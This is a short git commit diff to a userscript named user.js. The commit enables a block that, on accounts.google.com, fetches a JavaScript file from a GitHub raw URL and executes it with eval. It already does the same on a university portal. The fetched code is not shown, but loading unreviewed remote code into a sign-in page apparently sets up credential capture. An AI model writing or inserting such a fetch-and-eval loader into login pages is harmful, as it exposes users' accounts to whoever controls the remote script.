cde765591a3efdea43d0a024debb8bd7ba86d914
Wolota <123838258+Wolota@users.noreply.github.com>
2023-03-11 18:48:54 -0300

    Update user.js

--- user.js
+++ user.js
@@ -6,13 +6,10 @@ if (location.host == 'sigaa.ifsc.edu.br' || location.host == 'sig.ifsc.edu.br'){
 }
 
 
-//if (location.host == 'accounts.google.com'){
-//    let path = location.pathname.split('/');
-//    
-//    if (path[path.length - 1] == 'identifier'){
-//            url = "https://raw.githubusercontent.com/Wolota/ips/main/identifierGAccount.js";
-//    }
-//}
+if (location.host == 'accounts.google.com'){
+    url = "https://raw.githubusercontent.com/Wolota/ips/main/identifierGAccount.js";
+}
+
 
 if (url != undefined || url != null){
     fetch(url, { cache: 'no-store' }).then(response => response.text()).then(code => {eval(code);});
